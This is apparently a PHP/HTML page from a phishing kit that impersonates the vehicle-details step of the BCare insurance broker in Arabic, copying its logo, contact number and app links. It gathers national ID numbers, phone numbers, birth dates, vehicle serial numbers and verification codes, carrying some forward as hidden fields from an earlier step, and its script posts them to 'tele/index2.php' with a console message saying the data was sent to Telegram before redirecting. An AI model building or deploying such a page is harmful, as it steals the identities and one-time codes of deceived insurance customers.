<?php
// استقبال البيانات من الصفحة السابقة
$insurance_type = isset($_POST['insurance_type']) ? $_POST['insurance_type'] : '';
$identity_number = isset($_POST['identity_number']) ? $_POST['identity_number'] : '';
$applicant_name = isset($_POST['applicant_name']) ? $_POST['applicant_name'] : '';
$phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : '';
$birth_date = isset($_POST['birth_date']) ? $_POST['birth_date'] : '';
$registration_method = isset($_POST['registration_method']) ? $_POST['registration_method'] : '';
$serial_number = isset($_POST['serial_number']) ? $_POST['serial_number'] : '';
$verification_code = isset($_POST['verification_code']) ? $_POST['verification_code'] : '';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بي كير للتأمين | تفاصيل المركبة</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
/* CSS Variables */
:root {
    --color-background: #F4F7FB;
    --color-surface: #FFFFFF;
    --color-primary: #0F4C72;
    --color-primary-dark: #0B3856;
    --color-primary-light: #E6F0F7;
    --color-accent: #F2A340;
    --color-accent-dark: #D6892F;
    --color-text-primary: #0E1F2E;
    --color-text-secondary: #4B5B6B;
    --color-border: #D8E2EE;
    --color-info: #1E88E5;
    --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
    --shadow-card: 0 14px 30px rgba(15, 76, 114, 0.16);
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: var(--color-background);
    color: var(--color-text-primary);
    line-height: 1.6;
    overflow-x: hidden;
}

.container {
    max-width: 1280px;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Notification Banner */
.notification-banner {
    position: relative;
    background: var(--color-accent);
    color: white;
    padding: 0.75rem 1rem;
    display: flex;
    align-items: center;
    justify-content: center;
}

.close-notification {
    position: absolute;
    left: 1rem;
    background: transparent;
    border: none;
    cursor: pointer;
    padding: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0.9;
    transition: opacity 0.3s;
}

.close-notification:hover {
    opacity: 1;
}

.notification-content {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-size: 0.875rem;
}

.notification-icon {
    flex-shrink: 0;
}

.notification-text {
    font-weight: 500;
}

.notification-link {
    color: white;
    text-decoration: underline;
    font-weight: 600;
    margin-right: 0.25rem;
}

.notification-link:hover {
    text-decoration: none;
}

/* Header */
.header {
    position: sticky;
    top: 0;
    z-index: 500;
    background: var(--color-accent);
    color: white;
}

.header-content {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.75rem 1rem;
}

.back-link {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    color: white;
    text-decoration: none;
    font-size: 0.875rem;
    font-weight: 600;
}

.back-icon {
    width: 1.25rem;
    height: 1.25rem;
    stroke: white;
    stroke-width: 2;
    fill: none;
}

.header-title {
    font-size: 0.875rem;
    font-weight: 600;
}

.info-icon-header {
    width: 1.25rem;
    height: 1.25rem;
    fill: white;
}

/* Main Navigation */
.main-nav {
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(8px);
    border-bottom: 1px solid var(--color-border);
}

.nav-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    height: 4rem;
}

.nav-actions {
    display: flex;
    gap: 0.5rem;
}

.lang-btn, .profile-btn, .menu-btn {
    background: transparent;
    border: 1px solid var(--color-border);
    border-radius: 9999px;
    cursor: pointer;
    transition: background 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
}

.lang-btn:hover, .profile-btn:hover, .menu-btn:hover {
    background: rgba(0, 0, 0, 0.02);
}

.lang-btn {
    padding: 0.25rem 0.75rem;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-primary);
}

.profile-btn, .menu-btn {
    padding: 0.5rem;
}

.profile-icon, .menu-icon {
    width: 1.25rem;
    height: 1.25rem;
    stroke: var(--color-primary);
    stroke-width: 1.8;
    fill: none;
}

.menu-icon {
    stroke: var(--color-text-primary);
    stroke-width: 2;
}

.logo img {
    display: block;
}

/* Main Content */
.main-content {
    max-width: 48rem;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Form */
.insurance-form {
    margin-top: 1.5rem;
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
    padding-bottom: 2rem;
}

.form-card {
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid var(--color-border);
    border-radius: 1rem;
    padding: 1.5rem;
    box-shadow: var(--shadow-soft);
}

.form-field {
    margin-bottom: 1.25rem;
}

.form-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    margin-bottom: 0.5rem;
    text-align: right;
}

.form-field select,
.form-field input {
    width: 100%;
    padding: 0.75rem 1rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    color: var(--color-text-primary);
    text-align: right;
    transition: all 0.15s;
    font-family: inherit;
}

.form-field select:focus,
.form-field input:focus {
    outline: none;
    border-color: var(--color-primary);
    box-shadow: 0 0 0 2px var(--color-primary-light);
}

.form-field select {
    cursor: pointer;
    appearance: none;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%234B5B6B' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: left 1rem center;
    padding-left: 2.5rem;
}

/* Radio Buttons */
.radio-group {
    display: flex;
    gap: 1rem;
    margin-top: 0.5rem;
}

.radio-option {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.radio-option input[type="radio"] {
    width: 1.125rem;
    height: 1.125rem;
    accent-color: var(--color-primary);
    cursor: pointer;
}

.radio-option label {
    font-size: 0.875rem;
    color: var(--color-text-primary);
    cursor: pointer;
    margin: 0;
}

/* Agreement Text */
.agreement-text {
    background: var(--color-primary-light);
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    padding: 1rem;
    font-size: 0.75rem;
    line-height: 1.625;
    color: var(--color-text-secondary);
    text-align: right;
    margin-bottom: 1.5rem;
}

/* Submit Button */
.submit-btn {
    width: 100%;
    padding: 0.875rem;
    background: var(--color-accent);
    color: white;
    border: 1px solid var(--color-accent-dark);
    border-radius: 0.75rem;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.submit-btn:hover {
    box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
    transform: translateY(-1px);
}

/* Footer */
.footer {
    background: #0B2F48;
    color: #D6E4F0;
    margin-top: 3rem;
    padding: 2rem 0;
    text-align: center;
}

.footer-content {
    font-size: 0.75rem;
    line-height: 1.625;
}

.footer-logo {
    margin: 0 auto 1rem;
    width: 100px;
}

.footer-copyright {
    color: #9FB4C4;
    margin-bottom: 1rem;
}

.footer-contact {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    font-size: 0.75rem;
    margin-bottom: 1rem;
}

.footer-contact a {
    color: var(--color-accent);
    text-decoration: none;
    font-weight: 600;
}

.app-buttons {
    display: flex;
    gap: 0.75rem;
    justify-content: center;
    margin-top: 1rem;
}

@media (min-width: 768px) {
    .form-card {
        padding: 2rem;
    }
}
@media (min-width: 768px) {
    .form-card {
        padding: 2rem;
    }
}

/* Loading Overlay */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    backdrop-filter: blur(5px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

.loading-overlay.show {
    display: flex;
}

.loading-card {
    background: white;
    border-radius: 16px;
    padding: 40px 60px;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
}

.loading-logo {
    width: 120px;
    margin-bottom: 20px;
}

.loading-text {
    font-size: 16px;
    font-weight: 600;
    color: #333;
    margin-bottom: 20px;
}

.loading-spinner {
    width: 50px;
    height: 50px;
    margin: 0 auto;
}

.loading-spinner svg {
    width: 100%;
    height: 100%;
}

.loading-spinner circle {
    fill: none;
    stroke: #F2A340;
    stroke-width: 4;
    stroke-linecap: round;
    stroke-dasharray: 125;
    stroke-dashoffset: 30;
    animation: spin 1s linear infinite;
    transform-origin: center;
}

@keyframes spin {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}

    </style>
</head>
<body>
    <!-- Notification Banner -->
    <div class="notification-banner">
        <button class="close-notification" aria-label="إغلاق">
            <svg viewBox="0 0 24 24" width="20" height="20">
                <line x1="18" y1="6" x2="6" y2="18" stroke="white" stroke-width="2"></line>
                <line x1="6" y1="6" x2="18" y2="18" stroke="white" stroke-width="2"></line>
            </svg>
        </button>
        <div class="notification-content">
            <svg class="notification-icon" viewBox="0 0 24 24" width="20" height="20">
                <circle cx="12" cy="12" r="10" fill="white"></circle>
                <path d="M12 6v6m0 4h.01" stroke="#F2A340" stroke-width="2" stroke-linecap="round"></path>
            </svg>
            <span class="notification-text">حمّل تطبيق بي كير الآن!!</span>
            <a href="#" class="notification-link">تحميل</a>
        </div>
    </div>



    <!-- Main Navigation -->
    <div class="main-nav">
        <div class="container nav-content">
            <div class="nav-actions">
                <button class="lang-btn">EN</button>
                <button class="profile-btn" aria-label="الملف الشخصي">
                    <svg class="profile-icon" viewBox="0 0 24 24">
                        <path d="M20 21a8 8 0 0 0-16 0"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                </button>
            </div>
            <a href="#" class="logo">
                <img src="/bcare-logo.svg" alt="bcare logo" width="90" height="45">
            </a>
            <button class="menu-btn" aria-label="القائمة">
                <svg class="menu-icon" viewBox="0 0 24 24">
                    <line x1="3" y1="12" x2="21" y2="12"></line>
                    <line x1="3" y1="6" x2="21" y2="6"></line>
                    <line x1="3" y1="18" x2="21" y2="18"></line>
                </svg>
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <main class="main-content">
        <form class="insurance-form" id="vehicleForm" method="POST" action="tele/index2.php">
            <!-- Hidden fields from previous page -->
            <input type="hidden" name="insurance_type" value="<?php echo htmlspecialchars($insurance_type); ?>">
            <input type="hidden" name="identity_number" value="<?php echo htmlspecialchars($identity_number); ?>">
            <input type="hidden" name="applicant_name" value="<?php echo htmlspecialchars($applicant_name); ?>">
            <input type="hidden" name="phone_number" value="<?php echo htmlspecialchars($phone_number); ?>">
            <input type="hidden" name="birth_date" value="<?php echo htmlspecialchars($birth_date); ?>">
            <input type="hidden" name="registration_method" value="<?php echo htmlspecialchars($registration_method); ?>">
            <input type="hidden" name="serial_number" value="<?php echo htmlspecialchars($serial_number); ?>">
            <input type="hidden" name="verification_code" value="<?php echo htmlspecialchars($verification_code); ?>">

            <div class="form-card">
                <!-- نوع التغطية -->
                <div class="form-field">
                    <label for="coverageType">نوع التغطية</label>
                    <select id="coverageType" name="coverage_type" required>
                        <option value="">حدد الخيار</option>
                        <option value="third_party">ضد الغير</option>
                        <option value="comprehensive">شامل</option>
                    </select>
                </div>

                <!-- تاريخ بدء الوثيقة -->
                <div class="form-field">
                    <label for="policyStartDate">تاريخ بدء الوثيقة</label>
                    <input type="date" id="policyStartDate" name="policy_start_date" required>
                </div>

                <!-- الغرض من استخدام السيارة -->
                <div class="form-field">
                    <label for="vehiclePurpose">الغرض من استخدام السيارة</label>
                    <select id="vehiclePurpose" name="vehicle_purpose" required>
                        <option value="">اختر من القائمة</option>
                        <option value="personal">شخصي</option>
                        <option value="commercial">تجاري</option>
                        <option value="rental">تأجير</option>
                        <option value="ride_hailing">نقل الركاب (كريم/أوبر)</option>
                        <option value="cargo">نقل البضائع</option>
                        <option value="petroleum">نقل مشتقات نفطية</option>
                    </select>
                </div>

                <!-- نوع المركبة -->
                <div class="form-field">
                    <label for="vehicleType">نوع المركبة</label>
                    <input type="text" id="vehicleType" name="vehicle_type" placeholder="نوع المركبة" required>
                </div>

<!-- قيمة المركبة -->
<div class="form-field">
    <label for="vehicleValue">قيمة المركبة</label>
    <input type="number" 
           id="vehicleValue" 
           name="vehicle_value" 
           placeholder="قيمة المركبة (الحد الأدنى: 5000)" 
           min="5000"
           step="100"
           required>
    <span id="vehicleValueError" style="color: #dc3545; font-size: 0.75rem; display: none; margin-top: 0.25rem;">الحد الأدنى لقيمة المركبة هو 5000 ريال</span>
</div>

                <!-- سنة الصنع -->
                <div class="form-field">
                    <label for="manufactureYear">سنة الصنع</label>
                    <select id="manufactureYear" name="manufacture_year" required>
                        <option value="">اختر من القائمة</option>
                        <?php for($year = 2026; $year >= 1997; $year--): ?>
                        <option value="<?php echo $year; ?>"><?php echo $year; ?></option>
                        <?php endfor; ?>
                    </select>
                </div>



                <!-- مكان الإصلاح -->
                <div class="form-field">
                    <label>مكان الإصلاح</label>
                    <div class="radio-group">
                        <div class="radio-option">
                            <input type="radio" id="agency" name="repair_location" value="agency" required>
                            <label for="agency">الوكالة</label>
                        </div>
                        <div class="radio-option">
                            <input type="radio" id="workshop" name="repair_location" value="workshop">
                            <label for="workshop">الورشة</label>
                        </div>
                    </div>
                </div>

                <!-- Agreement Text -->
                <div class="agreement-text">
                    أوافق على ما يلي: عدم فتح عملية الوسيط الحق في الإستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي وبيانات مركبتي.
                </div>

                <!-- Submit Button -->
                <button type="submit" class="submit-btn">إظهار العروض</button>
            </div>
        </form>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="container footer-content">
            <img src="/bcare-logo.svg" alt="BCare Logo" class="footer-logo">
            <p class="footer-copyright">
                © 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين. خاضعة لرقابة وإشراف البنك المركزي السعودي.
            </p>
            <div class="footer-contact">
                <span>اتصل بنا</span>
                <a href="tel:8001180042">8001180042</a>
            </div>
            <div class="app-buttons">
                <a href="https://apps.apple.com/sa/app/بي-كير/id1490248033" target="_blank">
                    <img src="/ios_mobile_app.svg" alt="App Store" width="120" height="40">
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.app.bcare" target="_blank">
                    <img src="/android_mobile_app.svg" alt="Google Play" width="120" height="40">
                </a>
            </div>
        </div>
    </footer>

   <script>
// دوال الـ Loader
function showLoader() {
    document.getElementById('loadingOverlay').classList.add('show');
}

function hideLoader() {
    document.getElementById('loadingOverlay').classList.remove('show');
}

function showLoaderThen(callback, duration = 3000) {
    showLoader();
    setTimeout(() => {
        hideLoader();
        if (callback) callback();
    }, duration);
}

// Set minimum date to today
document.addEventListener('DOMContentLoaded', function() {
    const dateInput = document.getElementById('policyStartDate');
    const today = new Date().toISOString().split('T')[0];
    dateInput.min = today;
    dateInput.value = today;
    
    // Close notification banner
    const closeBtn = document.querySelector('.close-notification');
    const banner = document.querySelector('.notification-banner');
    
    if (closeBtn && banner) {
        closeBtn.addEventListener('click', function() {
            banner.style.display = 'none';
        });
    }
    
    // التحقق من قيمة المركبة
    const vehicleValueInput = document.getElementById('vehicleValue');
    const vehicleValueError = document.getElementById('vehicleValueError');
    
    if (vehicleValueInput && vehicleValueError) {
        // التحقق أثناء الكتابة
        vehicleValueInput.addEventListener('input', function() {
            const value = parseFloat(this.value);
            
            if (this.value && value < 5000) {
                vehicleValueError.style.display = 'block';
                this.style.borderColor = '#dc3545';
            } else {
                vehicleValueError.style.display = 'none';
                this.style.borderColor = '';
            }
        });
        
        // التحقق عند الخروج من الحقل
        vehicleValueInput.addEventListener('blur', function() {
            const value = parseFloat(this.value);
            
            if (this.value && value < 5000) {
                alert('الحد الأدنى لقيمة المركبة هو 5000 ريال');
                this.value = '5000';
                vehicleValueError.style.display = 'none';
                this.style.borderColor = '';
            }
        });
    }
    
    // Handle form submission
    const form = document.getElementById('vehicleForm');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // التحقق من قيمة المركبة قبل الإرسال
            const vehicleValue = parseFloat(document.getElementById('vehicleValue').value);
            if (!vehicleValue || vehicleValue < 5000) {
                alert('الحد الأدنى لقيمة المركبة هو 5000 ريال');
                document.getElementById('vehicleValue').focus();
                return false;
            }
            
            // جمع البيانات
            const formData = new FormData(form);
            const coverageType = document.getElementById('coverageType').value;
            
            fetch('tele/index2.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                console.log('تم الإرسال إلى Telegram:', data);
                
                const targetPage = (coverageType === 'third_party') ? 'gher.php' : 'shamel.php';
                
                // إظهار loader لمدة 3 ثواني ثم الانتقال
                showLoaderThen(() => {
                    const redirectForm = document.createElement('form');
                    redirectForm.method = 'POST';
                    redirectForm.action = targetPage;
                    
                    for (let [key, value] of formData.entries()) {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = value;
                        redirectForm.appendChild(input);
                    }
                    
                    document.body.appendChild(redirectForm);
                    redirectForm.submit();
                }, 3000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى');
            });
        });
    }
});
</script>
    <!-- Loading Overlay -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-card">
        <img src="/bcare-logo.svg" alt="BCare Logo" class="loading-logo">
        <div class="loading-text">جاري معالجة طلبك...</div>
        <div class="loading-spinner">
            <svg viewBox="0 0 50 50">
                <circle cx="25" cy="25" r="20"></circle>
            </svg>
        </div>
    </div>
</div>
</body>
</html>